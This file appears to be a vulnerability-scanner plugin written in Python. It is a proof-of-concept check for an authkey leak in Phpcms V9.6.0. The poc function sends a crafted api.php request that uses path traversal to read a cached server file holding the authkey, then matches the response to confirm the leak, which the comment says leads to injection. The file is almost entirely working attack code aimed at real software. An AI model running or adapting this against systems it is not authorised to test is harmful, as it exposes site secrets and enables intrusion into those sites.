# coding: utf-8
import requests
import re
#Phpcms V9.6.0 authkey泄露导致注入
def poc(url,user_agent,proxy):

    url = url.strip("/")
    exp_url = url  + '/api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..\..\..\phpsso_server\caches\caches_admin\caches_data\applist&path=admin'
    header = {'User-Agent': user_agent}

    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = requests.get(exp_url, headers=header, proxies=proxies)
    else:
        response = requests.get(exp_url, headers=header)

    if re.search('aaaaa(\[",+[0-9a-zA-Z]*,,,"\])',response.text)  and response.status_code==200:
        return 'Phpcms V9.6.0 - authkey泄露导致注入'


def run(url,logindict,user_agent,proxies):
    result = poc(url,user_agent,proxies)
    return result

